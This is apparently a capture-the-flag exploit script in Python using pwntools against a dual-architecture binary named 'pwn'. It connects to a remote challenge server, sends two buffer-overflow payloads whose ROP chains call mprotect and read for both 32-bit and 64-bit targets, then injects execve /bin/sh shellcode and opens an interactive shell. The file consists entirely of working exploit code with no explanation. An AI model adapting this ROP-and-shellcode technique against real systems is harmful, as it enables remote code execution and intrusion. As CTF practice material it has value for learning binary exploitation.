#!/usr/bin/env python
# -*- coding: utf-8 -*-
# 
from pwn import *
context.log_level = 'debug'
context.terminal = ['deepin-terminal', '-x', 'sh', '-c']
success = lambda name, value: log.success('{} -> {:#x}'.format(name, value))
def debug():
    binaryname = 'pwn'
    interruptPoint=[]
    pid = int(os.popen('pgrep {}'.format(binaryname)).readlines()[0])
    maps = os.popen('cat /proc/{}/maps'.format(pid))
    ELFaddr = 0
    libcaddr = 0
    for inf in maps.readlines():
        if ELFaddr == 0:
            if binaryname in inf:
                ELFaddr = int(inf.split('-', 1)[0], 16)
        if libcaddr == 0:
            if 'libc' in inf:
                libcaddr = int(inf.split('-', 1)[0], 16)
    info('pid : {}'.format(pid))
    success('elfbase', ELFaddr)
    success('libcbase', libcaddr)
    if len(interruptPoint) :
        for p in interruptPoint:
            success('interruptPoint', p+ELFaddr)
    raw_input('debug>')

# io = process('./pwn2')
io = remote('node2.buuoj.cn.wetolink.com', 28607)
elf2 = ELF('./pwn2')
elf1 = ELF('./pwn')

x32pop3 = 0x0809feab
x64pop3 = 0x0000000000401f32
prdi = 0x00000000004005f6
prsi = 0x0000000000405895
prdx = 0x000000000043b9d5
shellcode1 = 'jhh///sh/bin\x89\xe3h\x01\x01\x01\x01\x814$ri\x01\x011\xc9Qj\x04Y\x01\xe1Q\x89\xe11\xd2j\x0bX\xcd\x80'
shellcode2 = 'jhH\xb8/bin///sPH\x89\xe7hri\x01\x01\x814$\x01\x01\x01\x011\xf6Vj\x08^H\x01\xe6VH\x89\xe61\xd2j;X\x0f\x05'

payload = 'a' * 0x110 + p32(x32pop3) + 'bbbb' + p64(x64pop3)
payload += p32(elf1.sym['mprotect']) + p32(elf1.sym['main']) + p32(0x80da000) + p32(0x1000) + p32(7)
payload += 'cccc' + p64(prdi) + p64(0x6a3000) + p64(prsi) + p64(0x1000) + p64(prdx) + p64(7) + p64(elf2.sym['mprotect']) + p64(elf2.sym['main'])
# debug()
io.sendlineafter('pwn it?\n', payload)

payload  = 'a' * 0x110 + p32(x32pop3) + 'bbbb' + p64(x64pop3)
payload += p32(elf1.sym['read']) + p32(elf1.bss()) + p32(0) + p32(elf1.bss()) + p32(0x100)
payload += 'cccc' + p64(prdi) + p64(0) + p64(prsi) + p64(elf2.bss()) + p64(prdx) + p64(0x100) + p64(elf2.sym['read']) + p64(elf2.bss()+len(shellcode1))

io.sendlineafter('pwn it?\n', payload)
io.sendline(shellcode1+shellcode2)
io.interactive()
io.close()
